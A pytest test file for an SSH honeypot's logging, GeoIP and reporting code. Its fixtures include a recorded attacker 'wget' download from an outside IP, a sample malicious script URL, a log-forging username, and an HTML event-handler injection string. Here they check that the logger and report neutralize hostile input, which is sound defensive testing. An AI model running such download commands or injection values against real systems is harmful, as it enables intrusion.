import json

import pytest

from conftest import ROOT
from sshpot.analytics import analyze, read_events, render_markdown, render_text
from sshpot.geoip import GeoDB, country_name
from sshpot.logs import JsonlLogger, clip
from sshpot.sample import generate

GEO = ROOT / "sshpot" / "data" / "geoip-sample.csv"


# --- logs -----------------------------------------------------------------------


def test_jsonl_one_object_per_line_with_utc_timestamp(tmp_path):
    p = tmp_path / "a" / "log.jsonl"
    log = JsonlLogger(str(p))
    log.log("auth", username="root", password="p")
    log.log("connect", src_ip="1.2.3.4")
    log.close()
    rows = [json.loads(l) for l in p.read_text().splitlines()]
    assert [r["event"] for r in rows] == ["auth", "connect"]
    assert rows[0]["ts"].endswith("Z") and rows[0]["password"] == "p"


def test_hostile_values_cannot_forge_log_lines(tmp_path):
    p = tmp_path / "log.jsonl"
    log = JsonlLogger(str(p))
    log.log("auth", username='root"\n{"event":"auth","success":true}\r\x00')
    log.close()
    lines = p.read_text().splitlines()
    assert len(lines) == 1 and json.loads(lines[0])["event"] == "auth"
    assert "success" not in json.loads(lines[0])


def test_long_fields_are_clipped():
    assert (
        clip("a" * 5000).endswith("...[+3976 chars]") and len(clip("a" * 5000)) < 1100
    )
    assert clip(5) == 5 and clip("short") == "short"


def test_log_rotates_instead_of_growing_forever(tmp_path):
    p = tmp_path / "log.jsonl"
    log = JsonlLogger(str(p), max_bytes=500)
    for i in range(40):
        log.log("x", n=i, pad="y" * 50)
    log.close()
    assert (tmp_path / "log.jsonl.1").exists()
    assert p.stat().st_size < 1200 and (tmp_path / "log.jsonl.1").stat().st_size < 1200


# --- geoip ----------------------------------------------------------------------


def test_geoip_lookup_ranges_private_and_unknown():
    g = GeoDB.load(GEO)
    assert [
        g.lookup(ip)
        for ip in ("192.0.2.1", "192.0.2.255", "198.51.100.7", "203.0.113.200")
    ] == ["XA", "XA", "XB", "XC"]
    assert g.lookup("192.0.3.0") == "??" and g.lookup("8.8.8.8") == "??"
    assert g.lookup("10.1.2.3") == "private" and g.lookup("127.0.0.1") == "private"
    assert g.lookup("not an ip") == "??" and g.lookup("") == "??"


def test_geoip_loads_dbip_style_csv_with_ipv6_and_junk(tmp_path):
    f = tmp_path / "db.csv"
    f.write_text(
        '"1.0.0.0","1.0.0.255","AU"\n"2001:db8::","2001:db8::ffff","DE"\n# note\nbad,row\n"9.9.9.9","1.1.1.1","ZZ"\n'
    )
    g = GeoDB.load(f)
    assert g.lookup("1.0.0.77") == "AU" and g.lookup("2001:db8::1") == "DE"
    assert (
        g.lookup("9.9.9.9") == "??"
        and country_name("AU") == "AU"
        and country_name("US") == "United States"
    )


# --- analytics ------------------------------------------------------------------


def ev(event, **kw):
    return {"ts": "2026-10-18T01:00:00.000000Z", "event": event, **kw}


def test_analyze_counts_a_hand_built_log():
    events = [
        ev("connect", session="a", src_ip="192.0.2.5"),
        ev("connect", session="b", src_ip="192.0.2.5"),
        ev("connect", session="c", src_ip="198.51.100.1"),
        ev("client", session="a", client_version="SSH-2.0-Go", client_id="1"),
        ev("auth", session="a", username="root", password="123456", success=False),
        ev("auth", session="b", username="root", password="123456", success=False),
        ev("auth", session="c", username="admin", password="admin", success=True),
        ev("auth_pubkey", session="a", fingerprint="SHA256:abc"),
        ev("command", session="c", channel=1, input="uname -a", urls=[], ips=[]),
        ev(
            "command",
            session="c",
            channel=1,
            input="wget http://1.2.3.4/x",
            urls=["http://1.2.3.4/x"],
            ips=["1.2.3.4"],
        ),
        ev("command", session="c", channel=2, input="uname -a", urls=[], ips=[]),
        ev("forward_attempt", session="c"),
    ]
    rep = analyze(events, GeoDB.load(GEO), top=5)
    s = rep["summary"]
    assert (
        s["connections"],
        s["unique_ips"],
        s["auth_attempts"],
        s["successful_logins"],
    ) == (3, 2, 3, 1)
    assert (
        s["commands"],
        s["sessions_with_commands"],
        s["forward_attempts"],
        s["pubkey_attempts"],
    ) == (3, 2, 1, 1)
    assert rep["top_credential_pairs"][0] == {"value": "root:123456", "count": 2}
    assert rep["top_usernames"][0] == {"value": "root", "count": 2}
    assert rep["countries"][0] == {
        "country": "XA",
        "name": "Sample A",
        "connections": 2,
        "unique_ips": 1,
    }
    assert rep["clients"] == [{"value": "SSH-2.0-Go", "count": 1}]
    assert rep["indicator_urls"] == [{"value": "http://1.2.3.4/x", "count": 1}]
    assert rep["command_bigrams"] == [{"value": "uname -> wget", "count": 1}]
    seqs = {tuple(x["commands"]): x["sessions"] for x in rep["command_sequences"]}
    assert seqs == {("uname -a", "wget http://1.2.3.4/x"): 1, ("uname -a",): 1}
    assert rep["timeline"] == [{"hour": "2026-10-18T01:00Z", "connections": 3}]


def test_analyze_handles_empty_and_malformed_input():
    events, bad = read_events(
        [
            "",
            "not json",
            '{"no_event": 1}',
            "[1]",
            '{"event":"connect","src_ip":"1.1.1.1"}',
        ]
    )
    assert len(events) == 1 and bad == 3
    rep = analyze([], None, bad_lines=0)
    assert rep["summary"]["connections"] == 0 and rep["countries"] == []
    assert "Honeypot report" in render_text(rep) and "None." in render_markdown(rep)
    analyze(events, None)  # an event with no ts/session fields must not raise


def test_sample_log_summary_matches_its_known_shape(tmp_path):
    p = tmp_path / "s.jsonl"
    generate(str(p), seed=1, sessions=60)
    events, bad = read_events(p.read_text().splitlines())
    assert bad == 0
    rep = analyze(events, GeoDB.load(GEO), top=3)
    assert rep["summary"]["connections"] == 60
    assert {c["country"] for c in rep["countries"]} == {"XA", "XB", "XC"}
    assert rep["countries"][0]["country"] == "XA"  # weighted 5:3:2
    assert rep["top_command_names"][0]["value"] in {
        "uname",
        "cat",
        "cd",
        "wget",
        "chmod",
    }
    assert rep["indicator_urls"][0]["value"] == "http://203.0.113.9/x.sh"
    assert (
        len(rep["command_sequences"]) <= 3
        and rep["command_sequences"][0]["sessions"] >= 5
    )


def test_sample_generation_is_deterministic(tmp_path):
    a, b, c = (tmp_path / n for n in "abc")
    generate(str(a), seed=5), generate(str(b), seed=5), generate(str(c), seed=6)
    assert a.read_text() == b.read_text() != c.read_text()


def test_markdown_report_neutralizes_hostile_values():
    events = [
        ev(
            "auth",
            session="a",
            username="x|y",
            password="`<img src=x onerror=1>`\n# h",
            success=False,
        )
    ]
    md = render_markdown(analyze(events, None))
    assert "<img" in md  # shown, but only ever inside a code span
    for line in md.splitlines():
        if "<img" in line:
            assert line.count("`") % 2 == 0 and line.startswith("| `")
    assert "x\\|y" in md and "\n# h" not in md
